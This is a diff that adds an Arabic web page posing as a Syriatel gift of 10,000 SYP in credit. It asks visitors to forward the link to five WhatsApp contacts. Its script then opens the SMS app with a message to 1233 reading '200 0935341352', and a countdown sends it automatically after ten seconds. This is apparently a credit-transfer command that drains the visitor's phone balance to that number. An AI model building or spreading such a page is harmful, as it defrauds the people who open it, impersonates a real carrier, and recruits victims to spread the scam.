@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحويل إلى الرسائل</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Tajawal', sans-serif;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(45deg, #d3d3d3, #000000, #d3d3d3);
+            background-size: 400% 400%;
+            animation: gradientShift 5s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+        p {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        ul {
+            text-align: right;
+            direction: rtl;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 400px;
+        }
+        ul li {
+            margin: 5px 0;
+            color: #e3f2fd;
+        }
+        .buttons {
+            margin-top: 20px;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        button:hover {
+            background-color: #0056b3;
+            transform: scale(1.05);
+        }
+        #timer-message {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #ffc107;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
+        }
+        button:disabled {
+            background-color: #ddd;
+            cursor: not-allowed;
+        }
+        #shareCountMessage {
+            font-size: 18px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>أهلاً بك في سوريا الجديدة</h1>
+    <p>
+        نقدم لكل مواطن سوري مبلغ قدره <strong>10000 عشرة آلاف ليرة رصيد</strong> هدية مقدمة من سيريتيل على نية التوفيق.
+    </p>
+    <p><strong>شروط الكسب سهلة:</strong></p>
+    <ul>
+        <li>1. شارك هذه الرسالة لخمس أشخاص عبر تطبيق واتس آب من خلال زر رقم واحد.</li>
+        <li>2. اضغط الزر رقم اثنين وهو سيقوم بنسخ الكود الخاص وارساله لنا عبر رساله وارسال جائزتك آب.</li>
+    </ul>
+    <p><strong>ملاحظة:</strong> يرجى عدم ضغط زر 2 حتى تقوم بمشاركة المنشور لخمس أشخاص كي تصلك الهدية.</p>
+    
+    <!-- عرض عدد المشاركات المتبقية -->
+    <p id="shareCountMessage">المشاركات المتبقية للفوز: <span id="remainingShares">5</span></p>
+
+    <div class="buttons">
+        <button id="shareBtn" onclick="shareOnWhatsApp()">زر 1: شارك عبر واتس آب</button>
+        <button id="copyBtn" onclick="sendSMS()" disabled>زر 2: نسخ الكود وارساله للربح</button>
+    </div>
+    
+    <p id="timer-message">سيتم إرسال الرسالة تلقائيًا بعد <span id="timer">10</span> ثوانٍ...</p>
+
+    <script>
+        const number = "1233"; // رقم الهاتف
+        const message = "200  0935341352"; // محتوى الرسالة
+        const delay = 10; // عدد الثواني قبل الإرسال التلقائي
+        const siteLink = "https://azaamazeez.github.io/Newaa/"; // رابط الموقع
+        const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة رصيد هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
+        
+        let shareCount = 0; // عدد المشاركات
+
+        // وظيفة مشاركة الرسالة عبر واتس آب
+        function shareOnWhatsApp() {
+            // كلما شارك المستخدم، ازداد العد
+            shareCount++;
+            // تحديث عدد المشاركات المتبقية
+            const remainingShares = 5 - shareCount;
+            document.getElementById("remainingShares").textContent = remainingShares;
+
+            // تمكين زر 2 إذا كانت المشاركات 5 أو أكثر
+            if (shareCount >= 5) {
+                document.getElementById("copyBtn").disabled = false;
+            }
+            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
+            window.open(whatsappUrl, "_blank");
+            alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
+        }
+
+        // وظيفة إرسال الرسالة عبر تطبيق الرسائل (SMS)
+        function sendSMS() {
+            const phoneNumber = "1233"; // رقم الهاتف
+            const messageContent = "200 0935341352"; // محتوى الرسالة
+            
+            // فتح تطبيق الرسائل مع الرقم والمحتوى
+            window.location.href = `sms:${phoneNumber}?body=${encodeURIComponent(messageContent)}`;
+        }
+
+        // عداد زمني للإرسال التلقائي
+        let timeLeft = delay;
+        const timerElement = document.getElementById("timer");
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.textContent = timeLeft;
+
+            // إذا انتهى الوقت، يتم الإرسال تلقائيًا
+            if (timeLeft <= 0) {
+                clearInterval(countdown); // إيقاف العداد
+                sendSMS(); // إرسال الرسالة تلقائيًا
+            }
+        }, 1000); // تحديث كل ثانية
+    </script>
+</body>
+</html>
